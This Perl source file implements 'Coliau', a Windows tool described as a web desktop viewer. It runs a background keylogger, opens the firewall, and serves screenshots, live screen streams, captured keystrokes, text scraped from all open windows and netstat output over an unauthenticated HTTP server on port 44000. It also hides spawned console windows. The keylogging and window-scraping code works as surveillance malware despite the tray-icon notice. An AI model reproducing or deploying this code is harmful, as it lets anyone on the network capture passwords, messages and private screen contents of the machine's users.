#!wperl.exe
#
# Coliau is a desktop viewer over the web 
# run the app then from another machine open the url
# http://Your_PCs_IP:44000
#
# published under the Microsoft Reciprocal license
# angelos@unix.gr



package coliau;

use common::sense;

use IO::Select;
use HTTP::Daemon;
use HTTP::Response;
use HTTP::Status;
use HTTP::Request;
use Win32;
use Win32::API;
use Win32::GUI();
use Win32::GUI  qw (WM_QUERYENDSESSION WM_ENDSESSION WM_CLOSE);
use Win32::GUI::DIBitmap;
use Win32::GuiTest qw|FindWindowLike IsWindowVisible GetWindowText WMGetText IsKeyPressed GetAsyncKeyState|;
use Getopt::Long;
use threads;
use threads::shared;
use IO::Socket::INET;
use Win32::Process;
use Sys::Hostname;

my $PORT=44000;
my $VERBOSE=1;
my $KEYLOG:shared="";
my $TIP="Console Live Auditor\nhttp://www.unix.gr";
my $SLIDESBITS=32;
our %keymap;
my  $domain=Win32::DomainName();

push @INC, "." ;
require "Keymap.pl";
require "rau_html.pl";
require "firewallopen.pl";
require "dot_ico.pl";
require "bull_lined.pl";

my $SLEEP=10;
GetOptions (        'verbose'  		=> \$VERBOSE,);
firewallOpen();

#primary
my $GetDC = new Win32::API('user32', 'GetDC',     ['N'],     'N');
my $RelDC = new Win32::API('user32', 'ReleaseDC', [qw/N N/], 'I');
#Alternate
my $GetDW = new Win32::API('user32','GetDesktopWindow', [],  'N');
# Tertiary
my $DESKTOP = $GetDW->Call();

my $MAXSCREENS=4;
my $imgFname="screen.png";
my $NumScreens=CountMonitors();
# used in the commercial software
our $user=Win32::LoginName();
our $Node=Win32::NodeName();
our $domain=Win32::DomainName();
our $dot_icon;
our $bull_lined_icon;
our $bc_icon;
our $QUANTUM=105; # msecs
my $RepeatHeader=initRepeatHeader();
my $SESSION=~ "I am not a random session ID. The commercial version does that !";
my $RESIZE=1;


my $redIcon   	= makeIcon('red_dot.ico',$dot_icon);
my $bullIcon  	= makeIcon('bull_lined.ico',$bull_lined_icon);
#my $BCIcon  	= makeIcon('black_cursor.ico', $bc_icon);

# Key logger thread
my $keytid=threads->create('KeyLogger',$QUANTUM)->detach();

# GUI STUFF
our $main = Win32::GUI::Window->new(
	-name   => 'Main',
	-width  => 300,
	-height => 400,
	-minsize => [300, 400],
	-maxsize => [300, 400],
	-text    => "Console Live Auditor Log",
  	-visible => 1, 
	-resizable => 0,
	-icon	=> $bullIcon,
);

$main->ChangeSmallIcon($bullIcon);

$main->AddTextfield(
		-text    => "",
		-name    => "messages",
		-left    => 0,
		-top     => 0,
		-width   => 295,
		-height  => 370,
		-multiline => 1,
		-readonly => 1,
		-autohscroll =>1,
		-autovscroll =>1,
    );

our $trayIcon = $main->AddNotifyIcon(
	-name	=> 'NI',
	-icon	=> $bullIcon,
	-tip	=> $TIP ,
);

# if this thread is created elsewhere, perl croaks on exit !
my $webtid=threads->create('web',$SESSION,$trayIcon,$bullIcon,$redIcon)->detach();

colLog("Close this window for Coliau to terminate\r\n") if ( $VERBOSE);
colLog("I found $NumScreens Screens") if ( $VERBOSE);
colLog("Listening on port $PORT") if ( $VERBOSE);
Win32::GUI::Dialog(); # pass control over
$main->NI->Remove() ;
1;

################################################################################################
################################################################################################
################################################################################################

sub Main_Terminate {
		$main->NI->Remove() ;
		-1;
}
sub main_Terminate {
		$main->NI->Remove() ;
		-1;
}
sub Shutdown{
	print STDERR "Shutdown Called" if ( $VERBOSE);
	$main->NI->Remove();
	exit;
}

sub Main_Minimize {	
    $main->Disable();
    $main->Hide();
    1;
}

 sub NI_Click { # don't work with other threads ! Systray does that nicely    
	print "click";
    1;
}


########################################################################################
sub web{
my ($SESSION,$trayicon,$bullIcon,$redIcon)=@_;

$HTTP::Daemon::PROTO = "HTTP/1.0";  # sorry guys single threaded , must avoid blocking

my $daemon  = HTTP::Daemon->new(
		Listen=>10,
		LocalPort=>$PORT, 
		Timeout=>5,
		ReuseAddr=>1) || &Shutdown();	

colLog("Web Server On\r\n\r\n") if ( $VERBOSE);

#main code

my $numrequests=0;
	while ( 1 ) {
	my 	$c = $daemon->accept;
	next if ( ! $c ); # timed out
	
	# Verify the caller	( commercial only )
	my @ip = unpack("C4",$c->peeraddr);	  
	my $ip=join(".",@ip);
#	my $peername = gethostbyaddr($c->peeraddr,AF_INET);
#	colLog( $peername . ' = ' )if  ( ( $peername) && ( $VERBOSE) );
		
	set_icon($trayIcon,$redIcon,"Your Session is being monitored") if ( $trayicon);
		# go for it			
	process_one_req($c,$SESSION,$ip);
	set_icon($trayIcon,$bullIcon,$TIP) if ( $trayicon);	
	$c->close;		
	threads->yield();
	$numrequests++;		
	}
	
}



######## 
sub redirToURL {
	my $connection=shift;
	my $url=shift;
	my $response = HTTP::Response->new(307,"Moved Temporarily");
	$response->header("Location", $url);
	$connection->send_response($response);
	return;
}

########################################################################################
sub process_one_req {
my $connection = shift;	
my $SESSIONID=shift;
my $IP=shift;
	
	my $RepeatHTML=$RepeatHeader;
	
    my $receiver = $connection->get_request;
	if ( ! $receiver ) {
		return;
	}
	if  ($receiver->method ne 'GET'){					# Method GET
       		$connection->send_error(RC_FORBIDDEN);
			return;
	}
	
	$receiver->url->path =~ m/^\/(.*)$/mi;
	my $path=lc $1;	
	
		
	colLog( $IP . " -> " . $path ) if ( $VERBOSE);
	
	if  ($path eq "numscreens" ) {	
       		my $response = HTTP::Response->new(200);
			my $Text="The system has " . $NumScreens . " monitor(s)";
       		$response->content($Text);
			$connection->send_response($response);	
			return;
	}
	
	
	# URL is /monitor or null
	
	# choose screen bits !
	if  ($path eq "monitor8bits" )	{	$SLIDESBITS=8;		}
	if  ($path eq "monitor16bits" ) {	$SLIDESBITS=16;		}
	if  ($path eq "monitor32bits" ) {	$SLIDESBITS=32;		}
	
	if ( ($path eq "monitor" ) || ($path eq "" ) ) 	{
		domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	if ( $path =~ /^monitor/ ) {
		redirToURL($connection,"/monitor");
		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	
	
	# throw the screen at em
    if  ($path =~ /^screen([1-4]*)\.png$/ )  {		
		my $scrnum=1;
		if ( $1 ) {
			$scrnum=$1;
		}else {
			$scrnum=1;
		}
		my $resImage=screendumper($scrnum,$IP,'PNG');
      	my $response = HTTP::Response->new(200);
      	$response->push_header('Content-Type','image/png');
		$connection->send_response($response);		
		my $imgSize=length($resImage);
		colLog( "Image size=".$imgSize) if ( $VERBOSE);
		print $connection $resImage;
		print $connection "\n";
	}
	
	
	if ( $path eq "scale" ){
		$RESIZE=1;
		redirToURL($connection,"/monitor");		
		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	if ( $path eq "mobile" ){
		$RESIZE=2;
		redirToURL($connection,"/monitor");		
		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	
	if ( $path eq "noscale" ){
		$RESIZE=0;
		redirToURL($connection,"/monitor");		
		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return
	}
	
	
	if  ($path eq "scrape" ) {
		my $Text=DumpAnyText();
		my $response = HTTP::Response->new(200);
		$response->content( $Text);
		$connection->send_response($response);
		return;
	}
	
	if  ($path eq "keylog" ) {
		my $Text=$KEYLOG;
		$KEYLOG="";
		my $response = HTTP::Response->new(200);
		$response->content($Text);
		$connection->send_response($response);
		return;
	}
	
   	if  ($path eq "netstat" ) {					# /netstat
    	
		my $Text=readnetstat("c:\\WINDOWS\\system32\\\\netstat.exe -bn");
		my $response = HTTP::Response->new(200);
		if ( ! $Text ) {
      		$connection->send_error(404,"Could not do netstat");
		} else {
      		$response->content($Text);
			$connection->send_response($response);	
		}
		return;
	}
	
    
	# stream a gif image over ! ( gif animation ! ) 
	# blocks all other requests, must make it threaded
    if  ($path =~ /^stream([1-4]*)\.gif$/ )  {	 # almost live streaming
		my $scrnum=1;
		if ( $1 ) {
			$scrnum=$1;
		} else {
			$scrnum=1;
		}
		## this is bogus !
        my $header="HTTP/1.0 200 OK\n".
                    "Content-type: multipart/x-mixed-replace;" .
                    "boundary=***Boundary_String***\n";
					
        my $boundary="\n--***Boundary_String***\n";
        my $giftype="Content-type: image/gif\n\n";
        
        print $connection $header;
        print $connection $boundary;
        
        my $res=undef;
        my $imgSize=undef;
        do {            
            print $connection $giftype;            
            my $resImage=screendumper($scrnum,$IP,'GIF');
            $imgSize=length($resImage);
            colLog("Image size=".$imgSize) if ( $VERBOSE);
            $res=$connection->syswrite($resImage,$imgSize);            
            return if ( ( ! $res) || ( $res != $imgSize ) ); # break out
            print $connection  $boundary;            
            Win32::Sleep(50); # 50 millisecs
            threads->yield();
        } while (($res ) && ( $res==$imgSize));
    }
	
	# no matches from http request
	$connection->send_error(RC_FORBIDDEN);
}



######################################################################
sub domonitor{
	my ($connection,$RepeatHTML,$SESSIONID,$IP)=@_;
	
	for (my $i=1;$i<=$NumScreens;$i++){		
		my $fname="screen".$i.".png";
		my $screen="screen".$i;
		
		if ( $RESIZE==0 ) {
			$RepeatHTML .= 	"<img src=\"/$fname\"  width=\"100%\" name=\"$screen\" align=left>\r\n";
		} else {
		$RepeatHTML .= 	"<img src=\"/$fname\"  name=\"$screen\" align=left>\r\n";		
		}
	}
	$RepeatHTML .= "</html></body>";	
	
    my $response = HTTP::Response->new(200);
    $response->content($RepeatHTML);
	$connection->send_response($response);	
}



######################################################################
sub locatefile {
	my $filename=shift;
	      #snippet shamelessly stolen from splashscreen.pm
      my @dirs;
      # directory of perl script
      my $tmp = $0; $tmp =~ s/[^\/\\]*$//;
      push @dirs, $tmp;
      # cwd
      push @dirs, ".";
      push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
      push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};

      for my $dir (@dirs) {
              next unless -d $dir;
              colLog( "Attempting to locate \"$filename\" in $dir") if ($VERBOSE);
              if ( -f "$dir\\$filename" ) {
                      return $dir;
              }
      }
	  return undef;
}



######################################################################
# now catch the keyboard , while sleeping in fits and starts
#
# keylogger sleeps $QUANTUM miliseconds so use it to delay
#
######################################################################
sub KeyLogger{
  my  ($QUANTUM)=@_;  
  while (1) {	
 		for ( my $i=0; $i<255;$i++){
 			if (IsKeyPressed($i)){
				if ( length( $keymap{$i}) ==1  ) {
					if ($keymap{$i} eq " ") {
					    $KEYLOG .= "[ ]";
					} else  {
						$KEYLOG .= $keymap{$i};
						}
				} else {
					$KEYLOG .=  " " . $keymap{$i}  ;
				}
#					print "$KEYLOG\n" if ( $VERBOSE);  
			}
		}
		Win32::Sleep($QUANTUM);		
	}
	threads->yield();
}


############################################################
sub readnetstat{
	my $cmdline=shift;
 	my $Text="<table border=0><tr><th>Proto</th><th>Local Address</th><th>Foreign Address</th><th>State</th><th>PID</th></tr>\n";

	open (FIN , "$cmdline|") || return undef;	
	while (<FIN>){
		next if ( /^\s[\s]*$/);
		$_ =~ s/^\s*//g;
		$_ =~ s/\s[\s]*/ /g;
		chomp($_);
		chomp($_);
		next if ( /^Active/);
		next if ( /^Proto/);
		my ($Proto,$LocalAddress,$ForeignAddress,$State,$PID)=split(/\s/,$_);
		if  ( ( $Proto  eq 'TCP' ) or  ( $Proto  eq 'UDP')){
			$Text .= "<tr><td colspan=5>&nbsp<hr></td></tr>\n";
			$Text .= "<tr><td>$Proto</td><td>$LocalAddress</td><td>$ForeignAddress</td><td>$State</td><td>$PID</td></tr>\n";
		} else {
			$Text .= "<tr><td colspan=5>$_</td></tr>\n";
		}
	}
	$Text .= "</table>";
return $Text;
}


############################################################
sub screendumper{
	my $i=shift;
	my $IP=shift;
	my $type=shift;	

	my $disp="\\\\.\\Display".$i;
 	my $Screen = new Win32::GUI::DC("DISPLAY",$disp);
	
	if ( !$Screen){ 
		return undef;
	}

   	my $image = newFromDC Win32::GUI::DIBitmap($Screen) ;		
	Win32::GUI::DC::ReleaseDC(0,$Screen);
	
	my $resized=resize($image) if ( $image);
	my $ditherd=dither($resized) if ( $resized);

	my $result=undef;
	if ( $type eq 'PNG' ) {
		$result=$ditherd->SaveToData(Win32::GUI::DIBitmap::GetFIFFromFormat('PNG')) if ( $ditherd );
	}
	if ( $type eq 'GIF' ) {
	print Win32::GUI::DIBitmap::GetFIFFromFormat('GIF');
		$result=$ditherd->SaveToData(Win32::GUI::DIBitmap::GetFIFFromFormat('GIF') )  if ( $ditherd );	
	}
	
	return $result;	
}

############################################################
sub resize{
	my $image=shift;
	return undef if ( ! $image);
	
	my $new=undef;
	if ($RESIZE ==1) {			
		$new=$image->Rescale(640,480);		
	}	
	if ($RESIZE ==2) {			
		$new=$image->Rescale(320,240);
	}	
	if ( $new ) {
		return $new;
	}else {
		return $image; # just in case
	}
}



############################################################
sub dither{
	my $image=shift;
	return undef if ( ! $image);
	
	if ($SLIDESBITS ==8 ) {			
		my $new=$image->ConvertTo8Bits();	
		my $ximage=$new->ColorQuantize();		
		return $ximage;
	}
	if ($SLIDESBITS ==16 ) {
		my $ximage=$image->ConvertTo16Bits565();				
		return $ximage;
	}	
	return $image; # just in case
}

######################################################################
sub CountMonitors{
my $NumScreens=0;
for (my $i=0;$i<$MAXSCREENS;$i++){
	my $dispname="\\\\.\\Display".$i;
	my $Screen=new Win32::GUI::DC("DISPLAY",$dispname);
	if ( $Screen ) {
		my $image = newFromDC Win32::GUI::DIBitmap($Screen) ;
 		if ( $image ) {
			$NumScreens++;
		}
		Win32::GUI::DC::ReleaseDC(0,$Screen);
	}
}
return $NumScreens;
}


############# Screen Scraper Section ################
#####################################################
sub DumpAnyText{
	my $Text="";
	my @hwnds = FindWindowLike();     
	foreach my $window (@hwnds) {
		my $title=GetWindowText($window);
		next if ( $title =~ /^$/);
		$Text .= "[$title]\r\n";
	
		my @edits=FindWindowLike($window,"","");
		foreach my $ed (@edits) {
			my $text=" " x 65536;
			$text=GetWhatYoucan($ed);
			$text=~s/\x00/ / ;
			$text=~s/[\r\n]$// ;
			next if ($text =~ /^$/ );
			$Text .= "\t". $text . "\n";
		}
		$Text .= "\r\n";
	}
	return($Text);
}



######################################################################
sub GetWhatYoucan{
	my $ed=shift;

	my $text="";
    	eval {
       		local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
       		alarm 1;
		$text=WMGetText($ed);
       		alarm 0;
    	};
    	if ($@) {
		return undef;
    	}
	return $text;
}

######################################################################
sub set_icon{
my ($icon,$img,$tip)=@_;
  $icon->Change (    	
      -icon => $img,
      -tip  => $tip,
    );
}


######################################################################################## 
sub colLog {
	my $message=shift;
	my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
	$main->messages->Append($hour . ":" . $min . ":" . $sec ."     ");
	$main->messages->Append($message ."\r\n");
 }
 
 
########################################################################################
 sub makeIcon{
	my $iconFile=shift;
	my $iconData=shift;
	
	my $iconFileName = $ENV{'APPDATA'}."\\". $iconFile;
	open (ICON, ">" . $iconFileName);
	binmode ICON;
	print ICON $iconData;
	close ICON;
	
	my $Icon   = new Win32::GUI::Icon($iconFileName);
	
	return $Icon;
}

########################################################################################
BEGIN {
	# hide child windows like netstat :-)
 	if ( defined &Win32::SetChildShowWindow ){
		Win32::SetChildShowWindow(0) ;
 	}
 }

########################################################################################
########################################################################################
########################################################################################